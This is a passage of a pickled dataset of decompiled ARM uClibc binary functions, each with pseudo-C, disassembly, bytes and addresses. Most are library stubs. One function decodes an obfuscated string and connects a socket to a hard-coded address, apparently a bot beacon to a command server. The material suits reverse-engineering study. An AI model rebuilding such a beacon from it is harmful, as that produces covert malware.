S'.text:00008d78\n.text:00008d7c\n.text:00008d80\n.text:00008d84\n.text:00008d88\n.text:00008d8c\n.text:00008d90\n.text:00008d94\n.text:00008d98\n.text:00008d9c\n.text:00008da0\n.text:00008da4\n.text:00008da8\n.text:00008dac\n.text:00008db0\n.text:00008db4\n.text:00008db8\n.text:00008dbc\n.text:00008dc0\n.text:00008dc4\n.text:00008dc8\n.text:00008dcc\n.text:00008dd0\n.text:00008dd4\n.text:00008dd8\n.text:00008ddc\n.text:00008de0\n.text:00008de4\n.text:00008de8\n.text:00008dec\n.text:00008df0\n.text:00008df4\n.text:00008df8\n.text:00008dfc\n.text:00008e00\n.text:00008e04\n.text:00008e08\n.text:00008e0c\n.text:00008e10\n.text:00008e14\n.text:00008e18\n.text:00008e1c\n.text:00008e20\n.text:00008e24\n.text:00008e28\n.text:00008e2c\n.text:00008e30\n.text:00008e34\n'
p167
tp168
sS'__aeabi_idiv0'
p169
(S'\n__stdcall __aeabi_idiv0()\n'
p170
V\u000avoid __aeabi_idiv0(void)\u000a\u000a{\u000a  return;\u000a}\u000a\u000a
p171
S'mov pc,lr\n'
p172
S'0e f0 a0 e1\n'
p173
S'.text:0000b0d0\n'
p174
tp175
sS'bcopy'
p176
(S'\n__stdcall bcopy(void * __src, void * __dest, size_t __n)\n'
p177
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid bcopy(void *__src,void *__dest,size_t __n)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008a0c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_00013328)();\u000a  return;\u000a}\u000a\u000a
p178
S'adr r12,0x8a0c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x91c]!\n'
p179
S'00 c6 8f e2\n0a ca 8c e2\n1c f9 bc e5\n'
p180
S'.plt:00008a04\n.plt:00008a08\n.plt:00008a0c\n'
p181
tp182
sS'_start'
p183
(S'\n__stdcall _start(undefined param_1, undefined param_2, undefined param_3, undefined param_4, undefined4 param_5)\n'
p184
V\u000avoid _start(undefined4 param_1)\u000a\u000a{\u000a  undefined4 param_5;\u000a  \u000a  __uClibc_main(PTR_FUN_00008be4,param_5,&stack0x00000004,PTR__DT_INIT_00008be8,\u000a                PTR__DT_FINI_00008be0,param_1);\u000a  return;\u000a}\u000a\u000a
p185
S'mov r11,#0x0\nmov lr,#0x0\nldr r1,[sp],#0x4\ncpy r2,sp\nstr r2,[sp,#-0x4]!\nstr r0,[sp,#-0x4]!\nldr r12,[0x8be0]\nstr r12,[sp,#-0x4]!\nldr r0,[0x8be4]\nldr r3,[0x8be8]\nb 0x00008a34\n'
p186
S'00 b0 a0 e3\n00 e0 a0 e3\n04 10 9d e4\n0d 20 a0 e1\n04 20 2d e5\n04 00 2d e5\n10 c0 9f e5\n04 c0 2d e5\n0c 00 9f e5\n0c 30 9f e5\n95 ff ff ea\n'
p187
S'.text:00008bb0\n.text:00008bb4\n.text:00008bb8\n.text:00008bbc\n.text:00008bc0\n.text:00008bc4\n.text:00008bc8\n.text:00008bcc\n.text:00008bd0\n.text:00008bd4\n.text:00008bd8\n'
p188
tp189
sS'fcntl'
p190
(S'\n__stdcall fcntl(int __fd, int __cmd)\n'
p191
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint fcntl(int __fd,int __cmd,...)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008ab4. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013360)();\u000a  return iVar1;\u000a}\u000a\u000a
p192
S'adr r12,0x8ab4\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8ac]!\n'
p193
S'00 c6 8f e2\n0a ca 8c e2\nac f8 bc e5\n'
p194
S'.plt:00008aac\n.plt:00008ab0\n.plt:00008ab4\n'
p195
tp196
sS'FUN_00008ad0'
p197
(S'\n__stdcall FUN_00008ad0()\n'
p198
V\u000aundefined4 FUN_00008ad0(undefined4 uParm1)\u000a\u000a{\u000a  undefined *puVar1;\u000a  undefined *puVar2;\u000a  undefined4 uVar3;\u000a  code *pcVar4;\u000a  code **ppcVar5;\u000a  \u000a  puVar2 = PTR_PTR_DAT_00008b3c;\u000a  puVar1 = PTR___bss_start___00008b38;\u000a  if (*PTR___bss_start___00008b38 != 0) {\u000a    return uParm1;\u000a  }\u000a  ppcVar5 = *(code ***)PTR_PTR_DAT_00008b3c;\u000a  pcVar4 = *ppcVar5;\u000a  while (pcVar4 != (code *)0x0) {\u000a    *(code ***)puVar2 = ppcVar5 + 1;\u000a    uParm1 = (*pcVar4)();\u000a    ppcVar5 = *(code ***)puVar2;\u000a    pcVar4 = *ppcVar5;\u000a  }\u000a  if (DAT_00008b40 != (code *)0x0) {\u000a                    /* WARNING: Could not recover jumptable at 0x00008b28. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a    uVar3 = (*DAT_00008b40)();\u000a    return uVar3;\u000a  }\u000a  *puVar1 = 1;\u000a  return uParm1;\u000a}\u000a\u000a
p199
S'stmdb sp!,{ r4 r5 lr }\nldr r5,[0x8b38]\nldrb r3,[r5,#0x0]\ncmp r3,#0x0\nldmneia sp!,{ r4 r5 pc }\nldr r4,[0x8b3c]\nldr r3,[r4,#0x0]\nldr r2,[r3,#0x0]\ncmp r2,#0x0\nbeq 0x00008b18\nadd r3,r3,#0x4\nstr r3,[r4,#0x0]\nmov lr,pc\ncpy pc,r2\nldr r3,[r4,#0x0]\nldr r2,[r3,#0x0]\ncmp r2,#0x0\nbne 0x00008af8\nldr r3,[0x8b40]\ncmp r3,#0x0\nldrne r0,[0x8b44]\ncpyne lr,pc\ncpyne pc,r3\nmov r3,#0x1\nstrb r3,[r5,#0x0]\nldmia sp!,{ r4 r5 pc }\n'
p200
S'30 40 2d e9\n5c 50 9f e5\n00 30 d5 e5\n00 00 53 e3\n30 80 bd 18\n50 40 9f e5\n00 30 94 e5\n00 20 93 e5\n00 00 52 e3\n07 00 00 0a\n04 30 83 e2\n00 30 84 e5\n0f e0 a0 e1\n02 f0 a0 e1\n00 30 94 e5\n00 20 93 e5\n00 00 52 e3\nf7 ff ff 1a\n20 30 9f e5\n00 00 53 e3\n1c 00 9f 15\n0f e0 a0 11\n03 f0 a0 11\n01 30 a0 e3\n00 30 c5 e5\n30 80 bd e8\n'
p201
S'.text:00008ad0\n.text:00008ad4\n.text:00008ad8\n.text:00008adc\n.text:00008ae0\n.text:00008ae4\n.text:00008ae8\n.text:00008aec\n.text:00008af0\n.text:00008af4\n.text:00008af8\n.text:00008afc\n.text:00008b00\n.text:00008b04\n.text:00008b08\n.text:00008b0c\n.text:00008b10\n.text:00008b14\n.text:00008b18\n.text:00008b1c\n.text:00008b20\n.text:00008b24\n.text:00008b28\n.text:00008b2c\n.text:00008b30\n.text:00008b34\n'
p202
tp203
sS'__uClibc_main'
p204
(S'\n__stdcall __uClibc_main()\n'
p205
V\u000avoid __uClibc_main(void)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008a3c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_00013338)();\u000a  return;\u000a}\u000a\u000a
p206
S'adr r12,0x8a3c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8fc]!\n'
p207
S'00 c6 8f e2\n0a ca 8c e2\nfc f8 bc e5\n'
p208
S'.plt:00008a34\n.plt:00008a38\n.plt:00008a3c\n'
p209
tp210
sS'getsockopt'
p211
(S'\n__stdcall getsockopt(int __fd, int __level, int __optname, void * __optval, socklen_t * __optlen)\n'
p212
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint getsockopt(int __fd,int __level,int __optname,void *__optval,socklen_t *__optlen)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a78. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_0001334c)();\u000a  return iVar1;\u000a}\u000a\u000a
p213
S'adr r12,0x8a78\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8d4]!\n'
p214
S'00 c6 8f e2\n0a ca 8c e2\nd4 f8 bc e5\n'
p215
S'.plt:00008a70\n.plt:00008a74\n.plt:00008a78\n'
p216
tp217
sS'__umodsi3'
p218
(S'\n__stdcall __umodsi3()\n'
p219
V\u000auint __umodsi3(uint uParm1,uint uParm2)\u000a\u000a{\u000a  bool bVar1;\u000a  uint uVar2;\u000a  uint uVar3;\u000a  int iVar4;\u000a  bool bVar5;\u000a  bool bVar6;\u000a  bool bVar7;\u000a  \u000a  bVar7 = uParm2 != 0;\u000a  uVar3 = uParm2 - 1;\u000a  bVar5 = uVar3 == 0;\u000a  if (!bVar7) {\u000a    __aeabi_idiv0();\u000a    return 0;\u000a  }\u000a  if (!bVar5) {\u000a    bVar7 = uParm2 <= uParm1;\u000a  }\u000a  bVar1 = uParm1 == uParm2;\u000a  bVar6 = bVar5 || bVar1;\u000a  if (bVar5 || bVar1) {\u000a    uParm1 = 0;\u000a  }\u000a  if (bVar7 && (!bVar5 && !bVar1)) {\u000a    bVar6 = (uParm2 & uVar3) == 0;\u000a  }\u000a  if (bVar6) {\u000a    uParm1 = uParm1 & uVar3;\u000a  }\u000a  if (bVar7 && !bVar6) {\u000a    iVar4 = 0;\u000a    while (uParm2 < 0x10000000 && uParm2 < uParm1) {\u000a      uParm2 = uParm2 << 4;\u000a      iVar4 = iVar4 + 4;\u000a    }\u000a    while (uParm2 < 0x80000000 && uParm2 < uParm1) {\u000a      uParm2 = uParm2 << 1;\u000a      iVar4 = iVar4 + 1;\u000a    }\u000a    uVar3 = iVar4 - 3;\u000a    if (2 < iVar4) {\u000a      do {\u000a        if (uParm2 <= uParm1) {\u000a          uParm1 = uParm1 - uParm2;\u000a        }\u000a        if (uParm2 >> 1 <= uParm1) {\u000a          uParm1 = uParm1 - (uParm2 >> 1);\u000a        }\u000a        if (uParm2 >> 2 <= uParm1) {\u000a          uParm1 = uParm1 - (uParm2 >> 2);\u000a        }\u000a        if (uParm2 >> 3 <= uParm1) {\u000a          uParm1 = uParm1 - (uParm2 >> 3);\u000a        }\u000a        bVar7 = SBORROW4(uParm1,1);\u000a        uParm2 = uParm2 >> 4;\u000a        uVar2 = uParm1 - 1;\u000a        if (0 < (int)uParm1) {\u000a          bVar7 = SBORROW4(uVar3,4);\u000a          uVar3 = uVar3 - 4;\u000a          uVar2 = uVar3;\u000a        }\u000a      } while ((int)uVar2 < 0 == bVar7);\u000a      if ((uVar3 & 3) == 0 || uParm1 == 0) {\u000a        return uParm1;\u000a      }\u000a    }\u000a    if ((int)(uVar3 + 2) < 0 == SCARRY4(uVar3,2)) {\u000a      if (uVar3 != 0xfffffffe) {\u000a        if (uParm2 <= uParm1) {\u000a          uParm1 = uParm1 - uParm2;\u000a        }\u000a        uParm2 = uParm2 >> 1;\u000a      }\u000a      if (uParm2 <= uParm1) {\u000a        uParm1 = uParm1 - uParm2;\u000a      }\u000a      uParm2 = uParm2 >> 1;\u000a    }\u000a    if (uParm2 <= uParm1) {\u000a      uParm1 = uParm1 - uParm2;\u000a    }\u000a    return uParm1;\u000a  }\u000a  return uParm1;\u000a}\u000a\u000a
p220
S'subs r2,r1,#0x1\nbcc 0x0000b0c0\ncmpne r0,r1\nmoveq r0,#0x0\ntsthi r1,r2\nandeq r0,r0,r2\nmovls pc,lr\nmov r2,#0x0\ncmp r1,#0x10000000\ncmpcc r1,r0\nmovcc r1,r1, lsl #0x4\naddcc r2,r2,#0x4\nbcc 0x0000b024\ncmp r1,#0x80000000\ncmpcc r1,r0\nmovcc r1,r1, lsl #0x1\naddcc r2,r2,#0x1\nbcc 0x0000b038\nsubs r2,r2,#0x3\nblt 0x0000b090\ncmp r0,r1\nsubcs r0,r0,r1\ncmp r0,r1, lsr #0x1\nsubcs r0,r0,r1, lsr #0x1\ncmp r0,r1, lsr #0x2\nsubcs r0,r0,r1, lsr #0x2\ncmp r0,r1, lsr #0x3\nsubcs r0,r0,r1, lsr #0x3\ncmp r0,#0x1\nmov r1,r1, lsr #0x4\nsubges r2,r2,#0x4\nbge 0x0000b054\ntst r2,#0x3\nteqne r0,#0x0\nbeq 0x0000b0bc\ncmn r2,#0x2\nblt 0x0000b0b4\nbeq 0x0000b0a8\ncmp r0,r1\nsubcs r0,r0,r1\nmov r1,r1, lsr #0x1\ncmp r0,r1\nsubcs r0,r0,r1\nmov r1,r1, lsr #0x1\ncmp r0,r1\nsubcs r0,r0,r1\nmov pc,lr\nstr lr,[sp,#-0x8]!\nbl 0x0000b0d0\nmov r0,#0x0\nldr pc,[sp],#0x8\n'
p221
S'01 20 51 e2\n2c 00 00 3a\n01 00 50 11\n00 00 a0 03\n02 00 11 81\n02 00 00 00\n0e f0 a0 91\n00 20 a0 e3\n01 02 51 e3\n00 00 51 31\n01 12 a0 31\n04 20 82 32\nfa ff ff 3a\n02 01 51 e3\n00 00 51 31\n81 10 a0 31\n01 20 82 32\nfa ff ff 3a\n03 20 52 e2\n0e 00 00 ba\n01 00 50 e1\n01 00 40 20\na1 00 50 e1\na1 00 40 20\n21 01 50 e1\n21 01 40 20\na1 01 50 e1\na1 01 40 20\n01 00 50 e3\n21 12 a0 e1\n04 20 52 a2\nf3 ff ff aa\n03 00 12 e3\n00 00 30 13\n0a 00 00 0a\n02 00 72 e3\n06 00 00 ba\n02 00 00 0a\n01 00 50 e1\n01 00 40 20\na1 10 a0 e1\n01 00 50 e1\n01 00 40 20\na1 10 a0 e1\n01 00 50 e1\n01 00 40 20\n0e f0 a0 e1\n08 e0 2d e5\n01 00 00 eb\n00 00 a0 e3\n08 f0 9d e4\n'
p222
S'.text:0000b004\n.text:0000b008\n.text:0000b00c\n.text:0000b010\n.text:0000b014\n.text:0000b018\n.text:0000b01c\n.text:0000b020\n.text:0000b024\n.text:0000b028\n.text:0000b02c\n.text:0000b030\n.text:0000b034\n.text:0000b038\n.text:0000b03c\n.text:0000b040\n.text:0000b044\n.text:0000b048\n.text:0000b04c\n.text:0000b050\n.text:0000b054\n.text:0000b058\n.text:0000b05c\n.text:0000b060\n.text:0000b064\n.text:0000b068\n.text:0000b06c\n.text:0000b070\n.text:0000b074\n.text:0000b078\n.text:0000b07c\n.text:0000b080\n.text:0000b084\n.text:0000b088\n.text:0000b08c\n.text:0000b090\n.text:0000b094\n.text:0000b098\n.text:0000b09c\n.text:0000b0a0\n.text:0000b0a4\n.text:0000b0a8\n.text:0000b0ac\n.text:0000b0b0\n.text:0000b0b4\n.text:0000b0b8\n.text:0000b0bc\n.text:0000b0c0\n.text:0000b0c4\n.text:0000b0c8\n.text:0000b0cc\n'
p223
tp224
sS'__muldi3'
p225
(S'\n__stdcall __muldi3()\n'
p226
V\u000aundefined8 __muldi3(uint uParm1,int iParm2,uint uParm3,int iParm4)\u000a\u000a{\u000a  int iVar1;\u000a  uint uVar2;\u000a  uint uVar3;\u000a  uint uVar4;\u000a  uint uVar5;\u000a  \u000a  uVar4 = uParm1 & ~(uParm1 & 0xffff0000);\u000a  uVar3 = uParm3 & ~(uParm3 & 0xffff0000);\u000a  uVar2 = uVar4 * uVar3;\u000a  uVar3 = (uParm1 >> 0x10) * uVar3;\u000a  uVar4 = (uParm3 >> 0x10) * uVar4;\u000a  iVar1 = (uParm1 >> 0x10) * (uParm3 >> 0x10);\u000a  uVar5 = uVar3 + uVar4;\u000a  if (CARRY4(uVar3,uVar4)) {\u000a    iVar1 = iVar1 + 0x10000;\u000a  }\u000a  uVar3 = uVar5 * 0x10000;\u000a  return CONCAT44(uVar2 + uVar3,\u000a                  uParm3 * iParm2 +\u000a                  uParm1 * iParm4 + iVar1 + (uVar5 >> 0x10) + (uint)CARRY4(uVar2,uVar3));\u000a}\u000a\u000a
p227
S'stmdb sp!,{ r4 r5 r6 r7 r8 r10 lr }\ncpy r5,r0\ncpy r6,r1\nmov r10,r0, lsr #0x10\nmov r1,r2, lsr #0x10\nbic r8,r0,r10, lsl #0x10\nbic r7,r2,r1, lsl #0x10\nmul r4,r8,r7\nmul r7,r10,r7\nmul r8,r1,r8\nmul r1,r10,r1\nadds r8,r7,r8\naddcs r1,r1,#0x10000\nadds r4,r4,r8, lsl #0x10\nadc r1,r1,r8, lsr #0x10\ncpy r0,r4\nmla r4,r5,r3,r1\nmla r1,r2,r6,r4\ncpy lr,r2\nldmia sp!,{ r4 r5 r6 r7 r8 r10 pc }\n'
p228
S'f0 45 2d e9\n00 50 a0 e1\n01 60 a0 e1\n20 a8 a0 e1\n22 18 a0 e1\n0a 88 c0 e1\n01 78 c2 e1\n98 07 04 e0\n9a 07 07 e0\n91 08 08 e0\n9a 01 01 e0\n08 80 97 e0\n01 18 81 22\n08 48 94 e0\n28 18 a1 e0\n04 00 a0 e1\n95 13 24 e0\n92 46 21 e0\n02 e0 a0 e1\nf0 85 bd e8\n'
p229
S'.text:0000b0d4\n.text:0000b0d8\n.text:0000b0dc\n.text:0000b0e0\n.text:0000b0e4\n.text:0000b0e8\n.text:0000b0ec\n.text:0000b0f0\n.text:0000b0f4\n.text:0000b0f8\n.text:0000b0fc\n.text:0000b100\n.text:0000b104\n.text:0000b108\n.text:0000b10c\n.text:0000b110\n.text:0000b114\n.text:0000b118\n.text:0000b11c\n.text:0000b120\n'
p230
tp231
sS'calloc'
p232
(S'\n__stdcall calloc(size_t __nmemb, size_t __size)\n'
p233
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid * calloc(size_t __nmemb,size_t __size)\u000a\u000a{\u000a  void *pvVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089a0. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pvVar1 = (void *)(*(code *)PTR_LAB_00013304)();\u000a  return pvVar1;\u000a}\u000a\u000a
p234
S'adr r12,0x89a0\nadd r12,r12,#0xa000\nldr pc,[r12,#0x964]!\n'
p235
S'00 c6 8f e2\n0a ca 8c e2\n64 f9 bc e5\n'
p236
S'.plt:00008998\n.plt:0000899c\n.plt:000089a0\n'
p237
tp238
sS'_DT_INIT'
p239
(S'\n__stdcall _DT_INIT()\n'
p240
V\u000avoid _DT_INIT(void)\u000a\u000a{\u000a  FUN_00008b50();\u000a  FUN_0000b124();\u000a  return;\u000a}\u000a\u000a
p241
S'cpy r12,sp\nstmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 r12 lr pc}\nsub r11,r12,#0x4\nbl 0x00008b50\nbl 0x0000b124\nldmdb r11,{ r4 r5 r6 r7 r8 r9 r10 r11 sp pc}\n'
p242
S'0d c0 a0 e1\nf0 df 2d e9\n04 b0 4c e2\n98 00 00 eb\n0c 0a 00 eb\nf0 af 1b e9\n'
p243
S'.init:000088dc\n.init:000088e0\n.init:000088e4\n.init:000088e8\n.init:000088ec\n.init:000088f0\n'
p244
tp245
sS'setsockopt'
p246
(S'\n__stdcall setsockopt(int __fd, int __level, int __optname, void * __optval, socklen_t __optlen)\n'
p247
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint setsockopt(int __fd,int __level,int __optname,void *__optval,socklen_t __optlen)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089dc. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013318)();\u000a  return iVar1;\u000a}\u000a\u000a
p248
S'adr r12,0x89dc\nadd r12,r12,#0xa000\nldr pc,[r12,#0x93c]!\n'
p249
S'00 c6 8f e2\n0a ca 8c e2\n3c f9 bc e5\n'
p250
S'.plt:000089d4\n.plt:000089d8\n.plt:000089dc\n'
p251
tp252
sS'sleep'
p253
(S'\n__stdcall sleep(uint __seconds)\n'
p254
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000auint sleep(uint __seconds)\u000a\u000a{\u000a  uint uVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008964. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  uVar1 = (*(code *)PTR_LAB_000132f0)();\u000a  return uVar1;\u000a}\u000a\u000a
p255
S'adr r12,0x8964\nadd r12,r12,#0xa000\nldr pc,[r12,#0x98c]!\n'
p256
S'00 c6 8f e2\n0a ca 8c e2\n8c f9 bc e5\n'
p257
S'.plt:0000895c\n.plt:00008960\n.plt:00008964\n'
p258
tp259
sS'strcat'
p260
(S'\n__stdcall strcat(char * __dest, char * __src)\n'
p261
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000achar * strcat(char *__dest,char *__src)\u000a\u000a{\u000a  char *pcVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089b8. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pcVar1 = (char *)(*(code *)PTR_LAB_0001330c)();\u000a  return pcVar1;\u000a}\u000a\u000a
p262
S'adr r12,0x89b8\nadd r12,r12,#0xa000\nldr pc,[r12,#0x954]!\n'
p263
S'00 c6 8f e2\n0a ca 8c e2\n54 f9 bc e5\n'
p264
S'.plt:000089b0\n.plt:000089b4\n.plt:000089b8\n'
p265
tp266
sS'recv'
p267
(S'\n__stdcall recv(int __fd, void * __buf, size_t __n, int __flags)\n'
p268
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000assize_t recv(int __fd,void *__buf,size_t __n,int __flags)\u000a\u000a{\u000a  ssize_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008928. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_000132dc)();\u000a  return sVar1;\u000a}\u000a\u000a
p269
S'adr r12,0x8928\nadd r12,r12,#0xa000\nldr pc,[r12,#0x9b4]!\n'
p270
S'00 c6 8f e2\n0a ca 8c e2\nb4 f9 bc e5\n'
p271
S'.plt:00008920\n.plt:00008924\n.plt:00008928\n'
p272
tp273
sS'FUN_000099f0'
p274
(S'\n__stdcall FUN_000099f0()\n'
p275
V\u000a/* WARNING: Could not reconcile some variable overlaps */\u000a\u000aundefined4 FUN_000099f0(int *piParm1)\u000a\u000a{\u000a  undefined *puVar1;\u000a  undefined *puVar2;\u000a  int iVar3;\u000a  int iVar4;\u000a  char cVar5;\u000a  int iVar6;\u000a  undefined *puVar7;\u000a  bool bVar8;\u000a  int local_24;\u000a  in_addr_t local_20;\u000a  int local_1c;\u000a  int local_18;\u000a  \u000a  iVar3 = socket(2,1,0);\u000a  *piParm1 = iVar3;\u000a  puVar1 = PTR_DAT_00009b10;\u000a  if (-1 < iVar3) {\u000a    local_20 = 0;\u000a    local_1c = 0;\u000a    local_18 = 0;\u000a    local_24 = 2;\u000a    memset(PTR_DAT_00009b10 + 4,0,0x200);\u000a    puVar2 = PTR_DAT_00009b14;\u000a    if (*(short *)(puVar1 + 0x204) == 0) {\u000a      iVar3 = 0;\u000a    }\u000a    else {\u000a      iVar6 = *(int *)puVar1;\u000a      iVar3 = 0;\u000a      puVar7 = puVar1;\u000a      do {\u000a        iVar4 = 0;\u000a        do {\u000a          cVar5 = puVar2[iVar4];\u000a          bVar8 = *(char *)(iVar6 + iVar3) == cVar5;\u000a          if (bVar8) {\u000a            cVar5 = PTR_DAT_00009b18[iVar4];\u000a          }\u000a          iVar4 = iVar4 + 1;\u000a          if (bVar8) {\u000a            puVar7[4] = cVar5;\u000a          }\u000a        } while (iVar4 != 0x41);\u000a        iVar3 = iVar3 + 1;\u000a        puVar7 = puVar7 + 1;\u000a      } while (iVar3 < (int)(uint)*(ushort *)(puVar1 + 0x204));\u000a    }\u000a    puVar1[iVar3 + 4] = 0;\u000a    local_20 = inet_addr(PTR_DAT_00009b1c);\u000a    local_24 = CONCAT13(0x11,CONCAT12(0x9f,(sa_family_t)local_24));\u000a    piParm1[1] = local_24;\u000a    piParm1[2] = local_20;\u000a    piParm1[3] = local_1c;\u000a    piParm1[4] = local_18;\u000a    iVar3 = connect(*piParm1,(sockaddr *)&local_24,0x10);\u000a    if (iVar3 == 0) {\u000a      return 0;\u000a    }\u000a  }\u000a  return 0xffffffff;\u000a}\u000a\u000a
p276
S'stmdb sp!,{ r4 r5 r6 r7 lr }\nmov r1,#0x1\ncpy r7,r0\nsub sp,sp,#0x10\nmov r0,#0x2\nmov r2,#0x0\nbl 0x00008968\ncmp r0,#0x0\nstr r0,[r7,#0x0]\nblt 0x00009b08\nldr r5,[0x9b10]\nmov r6,#0x0\nmov r3,#0x2\ncpy r1,r6\nmov r2,#0x200\nadd r0,r5,#0x4\nstr r6,[sp,#0x0]\nstr r6,[sp,#0x4]\nstrb r3,[sp,#0x0]\nstr r6,[sp,#0x8]\nstr r6,[sp,#0xc]\nstrb r6,[sp,#0x1]\nbl 0x00008a40\nldrb r2,[r5,#0x204]\nldrb r3,[r5,#0x205]\norrs r3,r2,r3, lsl #0x8\ncpyeq r1,r6\nbeq 0x00009ab4\nldr r12,[r5,#0x0]\nldr r4,[0x9b14]\ncpy r1,r6\ncpy lr,r5\nmov r0,#0x0\nldrb r2,[r0,r4]\nldrb r3,[r12,r1]\ncmp r3,r2\nldreq r3,[0x9b18]\nldrbeq r2,[r0,r3]\nadd r0,r0,#0x1\nstrbeq r2,[lr,#0x4]\ncmp r0,#0x41\nbne 0x00009a74\nldrb r3,[r5,#0x204]\nldrb r2,[r5,#0x205]\nadd r1,r1,#0x1\norr r3,r3,r2, lsl #0x8\ncmp r3,r1\nadd lr,lr,#0x1\nbgt 0x00009a70\nadd r2,r1,r5\nmov r3,#0x0\nstrb r3,[r2,#0x4]\nldr r0,[0x9b1c]\nbl 0x000089bc\nmov r3,#0x9f\nmov r2,#0x11\nstr r0,[sp,#0x4]\nstrb r3,[sp,#0x2]\nstrb r2,[sp,#0x3]\nldmia sp,{r0 r1 r2 r3 }\nadd r12,r7,#0x4\nstmia r12,{r0 r1 r2 r3 }\nldr r0,[r7,#0x0]\ncpy r1,sp\nmov r2,#0x10\nbl 0x0000892c\ncmp r0,#0x0\nbne 0x00009b08\nadd sp,sp,#0x10\nldmia sp!,{ r4 r5 r6 r7 pc }\nmvn r0,#0x0\nb 0x00009b00\n'
p277
S'f0 40 2d e9\n01 10 a0 e3\n00 70 a0 e1\n10 d0 4d e2\n02 00 a0 e3\n00 20 a0 e3\nd6 fb ff eb\n00 00 50 e3\n00 00 87 e5\n3b 00 00 ba\nf0 50 9f e5\n00 60 a0 e3\n02 30 a0 e3\n06 10 a0 e1\n02 2c a0 e3\n04 00 85 e2\n00 60 8d e5\n04 60 8d e5\n00 30 cd e5\n08 60 8d e5\n0c 60 8d e5\n01 60 cd e5\nfc fb ff eb\n04 22 d5 e5\n05 32 d5 e5\n03 34 92 e1\n06 10 a0 01\n14 00 00 0a\n00 c0 95 e5\na8 40 9f e5\n06 10 a0 e1\n05 e0 a0 e1\n00 00 a0 e3\n04 20 d0 e7\n01 30 dc e7\n02 00 53 e1\n90 30 9f 05\n03 20 d0 07\n01 00 80 e2\n04 20 ce 05\n41 00 50 e3\nf6 ff ff 1a\n04 32 d5 e5\n05 22 d5 e5\n01 10 81 e2\n02 34 83 e1\n01 00 53 e1\n01 e0 8e e2\nee ff ff ca\n05 20 81 e0\n00 30 a0 e3\n04 30 c2 e5\n54 00 9f e5\nbc fb ff eb\n9f 30 a0 e3\n11 20 a0 e3\n04 00 8d e5\n02 30 cd e5\n03 20 cd e5\n0f 00 9d e8\n04 c0 87 e2\n0f 00 8c e8\n00 00 97 e5\n0d 10 a0 e1\n10 20 a0 e3\n8c fb ff eb\n00 00 50 e3\n01 00 00 1a\n10 d0 8d e2\nf0 80 bd e8\n00 00 e0 e3\nfb ff ff ea\n'
p278
S'.text:000099f0\n.text:000099f4\n.text:000099f8\n.text:000099fc\n.text:00009a00\n.text:00009a04\n.text:00009a08\n.text:00009a0c\n.text:00009a10\n.text:00009a14\n.text:00009a18\n.text:00009a1c\n.text:00009a20\n.text:00009a24\n.text:00009a28\n.text:00009a2c\n.text:00009a30\n.text:00009a34\n.text:00009a38\n.text:00009a3c\n.text:00009a40\n.text:00009a44\n.text:00009a48\n.text:00009a4c\n.text:00009a50\n.text:00009a54\n.text:00009a58\n.text:00009a5c\n.text:00009a60\n.text:00009a64\n.text:00009a68\n.text:00009a6c\n.text:00009a70\n.text:00009a74\n.text:00009a78\n.text:00009a7c\n.text:00009a80\n.text:00009a84\n.text:00009a88\n.text:00009a8c\n.text:00009a90\n.text:00009a94\n.text:00009a98\n.text:00009a9c\n.text:00009aa0\n.text:00009aa4\n.text:00009aa8\n.text:00009aac\n.text:00009ab0\n.text:00009ab4\n.text:00009ab8\n.text:00009abc\n.text:00009ac0\n.text:00009ac4\n.text:00009ac8\n.text:00009acc\n.text:00009ad0\n.text:00009ad4\n.text:00009ad8\n.text:00009adc\n.text:00009ae0\n.text:00009ae4\n.text:00009ae8\n.text:00009aec\n.text:00009af0\n.text:00009af4\n.text:00009af8\n.text:00009afc\n.text:00009b00\n.text:00009b04\n.text:00009b08\n.text:00009b0c\n'
p279
tp280
sS'FUN_000096d0'
p281
(S'\n__stdcall FUN_000096d0()\n'
p282
